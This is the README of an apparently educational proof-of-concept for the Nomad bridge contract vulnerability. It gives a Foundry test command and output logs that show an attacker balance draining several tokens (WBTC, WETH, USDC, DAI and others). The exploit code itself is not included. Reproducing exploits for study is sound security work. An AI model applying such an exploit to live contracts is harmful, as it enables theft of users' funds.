# Nomad Bridge Exploit PoC

This is an educational proof-of-concept for the [vulnerability in a Nomad bridge contract](https://twitter.com/samczsun/status/1554252024723546112).

This is _not_ an attempt to reproduce the actual exploit transactions [1], [2].

This is just an alternative, more efficient version, only built for educational purposes.

## Requirements

- [Foundry](https://book.getfoundry.sh)

## Run

Run test as follows:

```
% forge test -vvv
[⠰] Compiling...
[⠑] Compiling 7 files with 0.7.6
[⠒] Solc 0.7.6 finished in 4.27s
Compiler run successful

Running 1 test for test/Nomad.t.sol:NomadTest
[PASS] testExploit() (gas: 870543)
Logs:
  [*] Stealing 102825072399 WBTC
      Attacker balance before: 0
      Attacker balance after:  102825072399
  [*] Stealing 22876823832591440628473 WETH
      Attacker balance before: 0
      Attacker balance after:  22876823832591440628473
  [*] Stealing 87459362891749 USDC
      Attacker balance before: 0
      Attacker balance after:  87459362891749
  [*] Stealing 8625217954867 USDT
      Attacker balance before: 0
      Attacker balance after:  8625217954867
  [*] Stealing 4533633070213997592670853 DAI
      Attacker balance before: 10000000000000000
      Attacker balance after:  4533633080213997592670853
  [*] Stealing 119088082279787950000000 FXS
      Attacker balance before: 0
      Attacker balance after:  119088082279787950000000
  [*] Stealing 113403733648696872600000000 CQT
      Attacker balance before: 0
      Attacker balance after:  113403733648696872600000000
```